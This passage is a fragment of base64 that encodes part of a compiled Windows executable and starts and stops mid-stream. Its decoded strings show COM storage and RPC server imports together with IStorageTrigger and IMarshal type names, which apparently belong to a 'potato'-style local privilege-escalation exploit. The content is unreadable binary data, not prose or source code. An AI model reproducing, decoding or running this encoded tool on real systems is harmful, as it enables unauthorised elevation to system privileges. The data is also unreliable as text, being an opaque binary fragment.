AADqfAgAAAAAAUJ8CAAAAAABgnwIAAAAAAHKfAgAAAAAARKYCAAAAAAA2pgIAAAAAACimAgAAAAAAGqYCAAAAAAAOpgIAAAAAAPqlAgAAAAAA6qUCAAAAAAAMnwIAAAAAAMKlAgAAAAAArqUCAAAAAACcpQIAAAAAAIylAgAAAAAAcqUCAAAAAABYpQIAAAAAAD6lAgAAAAAAKKUCAAAAAAAcpQIAAAAAABClAgAAAAAABqUCAAAAAAD0pAIAAAAAAOSkAgAAAAAA0KQCAAAAAADEpAIAAAAAAASfAgAAAAAA2KUCAAAAAAD4ngIAAAAAAK6kAgAAAAAAoKQCAAAAAACQpAIAAAAAAHShAgAAAAAAiKECAAAAAACioQIAAAAAALahAgAAAAAA0qECAAAAAADwoQIAAAAAAASiAgAAAAAAGKICAAAAAAA0ogIAAAAAAE6iAgAAAAAAZKICAAAAAAB6ogIAAAAAAJSiAgAAAAAAqqICAAAAAAC+ogIAAAAAANCiAgAAAAAA3KICAAAAAADuogIAAAAAAPyiAgAAAAAAEKMCAAAAAAAiowIAAAAAADKjAgAAAAAAQqMCAAAAAABaowIAAAAAAHKjAgAAAAAAiqMCAAAAAACyowIAAAAAAL6jAgAAAAAAzKMCAAAAAADaowIAAAAAAOSjAgAAAAAA8qMCAAAAAAAEpAIAAAAAABKkAgAAAAAAKKQCAAAAAAA4pAIAAAAAAESkAgAAAAAAWqQCAAAAAABspAIAAAAAAH6kAgAAAAAAAAAAAAAAAAAqoQIAAAAAABChAgAAAAAAVqECAAAAAADsoAIAAAAAANSgAgAAAAAAtqACAAAAAAD+oAIAAAAAAEKhAgAAAAAAAAAAAAAAAAABAAAAAAAAgAIAAAAAAACAAwAAAAAAAIANAAAAAAAAgGCgAgAAAAAAcwAAAAAAAIALAAAAAAAAgHQAAAAAAACAFwAAAAAAAIAEAAAAAAAAgBAAAAAAAACACQAAAAAAAIBQoAIAAAAAAG8AAAAAAACAEwAAAAAAAIAAAAAAAAAAAO6fAgAAAAAA2p8CAAAAAAAqoAIAAAAAALifAgAAAAAApp8CAAAAAACUnwIAAAAAAMifAgAAAAAADqACAAAAAAAAAAAAAAAAAFUDSGVhcEZyZWUAAI8FU2xlZXAAagJHZXRMYXN0RXJyb3IAAFEDSGVhcEFsbG9jAL4CR2V0UHJvY2Vzc0hlYXAAAOoFV2FpdEZvclNpbmdsZU9iamVjdAD1AENyZWF0ZVRocmVhZAAAuAJHZXRQcm9jQWRkcmVzcwAAgQJHZXRNb2R1bGVIYW5kbGVXAABLRVJORUwzMi5kbGwAAIsAQ29UYXNrTWVtQWxsb2MAABAAQ0xTSURGcm9tU3RyaW5nAGAAQ29Jbml0aWFsaXplAACQAENvVW5pbml0aWFsaXplAAArAENvQ3JlYXRlSW5zdGFuY2UAAPsBU3RnQ3JlYXRlRG9jZmlsZU9uSUxvY2tCeXRlcwAApQBDcmVhdGVJTG9ja0J5dGVzT25IR2xvYmFsAEwAQ29HZXRJbnN0YW5jZUZyb21JU3RvcmFnZQBvbGUzMi5kbGwApABmcmVlYWRkcmluZm8AAKUAZ2V0YWRkcmluZm8AV1MyXzMyLmRsbAAA3gBDcnlwdFN0cmluZ1RvQmluYXJ5QQAAfABDcnlwdEJpbmFyeVRvU3RyaW5nQQAAQ1JZUFQzMi5kbGwA3AFScGNTZXJ2ZXJSZWdpc3RlckF1dGhJbmZvQQAA3wFScGNTZXJ2ZXJSZWdpc3RlcklmMgAAkgFScGNFcFJlZ2lzdGVyQQAA2wFScGNTZXJ2ZXJMaXN0ZW4A7AFScGNTZXJ2ZXJVc2VQcm90c2VxRXBBAADOAVJwY1NlcnZlcklucUJpbmRpbmdzAAAyAU5kclNlcnZlckNhbGxBbGwAADEBTmRyU2VydmVyQ2FsbDIAAFJQQ1JUNC5kbGwAANUEUnRsQ2FwdHVyZUNvbnRleHQA3ARSdGxMb29rdXBGdW5jdGlvbkVudHJ5AADjBFJ0bFZpcnR1YWxVbndpbmQAAMAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAB/BVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAgAkdldEN1cnJlbnRQcm9jZXNzAJ4FVGVybWluYXRlUHJvY2VzcwAAjANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AFIEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAIQJHZXRDdXJyZW50UHJvY2Vzc0lkACUCR2V0Q3VycmVudFRocmVhZElkAADzAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAG8DSW5pdGlhbGl6ZVNMaXN0SGVhZACFA0lzRGVidWdnZXJQcmVzZW50ANoCR2V0U3RhcnR1cEluZm9XANYDTG9jYWxGcmVlAK8BRm9ybWF0TWVzc2FnZUEAAOIEUnRsVW53aW5kRXgA3gRSdGxQY1RvRmlsZUhlYWRlcgBoBFJhaXNlRXhjZXB0aW9uAABBBVNldExhc3RFcnJvcgAANAFFbmNvZGVQb2ludGVyADgBRW50ZXJDcml0aWNhbFNlY3Rpb24AAMQDTGVhdmVDcml0aWNhbFNlY3Rpb24AABQBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAGsDSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkFuZFNwaW5Db3VudACwBVRsc0FsbG9jAACyBVRsc0dldFZhbHVlALMFVGxzU2V0VmFsdWUAsQVUbHNGcmVlALQBRnJlZUxpYnJhcnkAygNMb2FkTGlicmFyeUV4VwAAZwFFeGl0UHJvY2VzcwCAAkdldE1vZHVsZUhhbmRsZUV4VwAA3AJHZXRTdGRIYW5kbGUAACUGV3JpdGVGaWxlAH0CR2V0TW9kdWxlRmlsZU5hbWVXAADfAUdldENvbW1hbmRMaW5lQQDgAUdldENvbW1hbmRMaW5lVwCeAENvbXBhcmVTdHJpbmdXAAC4A0xDTWFwU3RyaW5nVwAAWAJHZXRGaWxlVHlwZQARBldpZGVDaGFyVG9NdWx0aUJ5dGUAfgFGaW5kQ2xvc2UAhAFGaW5kRmlyc3RGaWxlRXhXAACVAUZpbmROZXh0RmlsZVcAkgNJc1ZhbGlkQ29kZVBhZ2UAuwFHZXRBQ1AAAKECR2V0T0VNQ1AAAMoBR2V0Q1BJbmZvAPYDTXVsdGlCeXRlVG9XaWRlQ2hhcgBBAkdldEVudmlyb25tZW50U3RyaW5nc1cAALMBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAJAVTZXRFbnZpcm9ubWVudFZhcmlhYmxlVwBbBVNldFN0ZEhhbmRsZQAA4QJHZXRTdHJpbmdUeXBlVwAAqAFGbHVzaEZpbGVCdWZmZXJzAAAJAkdldENvbnNvbGVPdXRwdXRDUAAABQJHZXRDb25zb2xlTW9kZQAAVgJHZXRGaWxlU2l6ZUV4ADMFU2V0RmlsZVBvaW50ZXJFeAAAWgNIZWFwU2l6ZQAAWANIZWFwUmV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AAMSFAgA8UgAATlIAAGiFAgBQUgAAYlIAAGiFAgBkUgAA8VIAAOiIAgD0UgAAGVMAALyFAgAcUwAAJ1UAABCIAgAoVQAAyFUAAPyIAgDIVQAA8FUAAGiFAgDwVQAACVYAAGiFAgBQVgAAYFYAABCJAgBwVgAAAFgAAByJAgAAWAAAH1gAAGiFAgAgWAAAOVgAAGiFAgA8WAAA+1gAANSHAgD8WAAAQ1kAAGiFAgBEWQAAZlkAAGiFAgBoWQAAj1kAAGiFAgCQWQAAuVkAALyFAgDIWQAAA1oAAMSFAgAUWgAAeloAALyFAgB8WgAAY1sAACCJAgBkWwAAYl0AAAiLAgBkXQAAZV8AAEiLAgBoXwAAKGAAAIiLAgAoYAAA6WAAALSLAgDsYAAAvWEAACCMAgDAYQAAkWIAACCMAgCUYgAAWWcAAOCLAgBcZwAAV2wAAACMAgBYbAAAbW4AADiMAgBwbgAAX3EAAFSMAgBgcQAAnXIAAPCKAgCgcgAA4nMAAPCKAgDkcwAAG3YAAMCKAgAcdgAAsHgAANiKAgCweAAAKnkAALyFAgAEegAAQHoAALyFAgBgegAASnwAALyJAgBMfAAAnH4AAEiKAgAkgAAAq4AAALyFAgCsgAAA3IAAAMSFAgDcgAAAZoIAAFyJAgBoggAAToUAAPiJAgBQhQAA5oUAAKiJAgDohQAA1YYAAKSKAgDYhgAAYIcAAKiJAgAciAAA6ogAADSJAgDsiAAAs4kAAEyJAgDQiQAA6IkAAHiMAgDwiQAA8YkAAHyMAgAAigAAAYoAAICMAgA8igAAbooAAGiFAgBwigAAp4oAALyFAgCoigAA9IsAAISMAgD0iwAAOYwAALyFAgA8jAAAgowAALyFAgCEjAAAyowAALyFAgDMjAAAHY0AAMSFAgAgjQAAgY0AANSHAgCgjQAA4I0AAKCMAgDwjQAAGo4AAKiMAgAgjgAARo4AALCMAgBQjgAAl44AALiMAgCwjgAAwI4AAMCMAgDQjgAARZUAAMyMAgBIlQAAgJUAAPyMAgCAlQAAQZYAANyMAgBQlgAADJcAANCMAgAMlwAAVpcAALyFAgBYlwAAs5cAALyFAgDolwAAJJgAAGiFAgAwmAAAT5kAAPCKAgBkmQAAv5kAALyFAgDYmQAAFZoAAOyOAgAYmgAAVZoAAMiOAgBYmgAAI5w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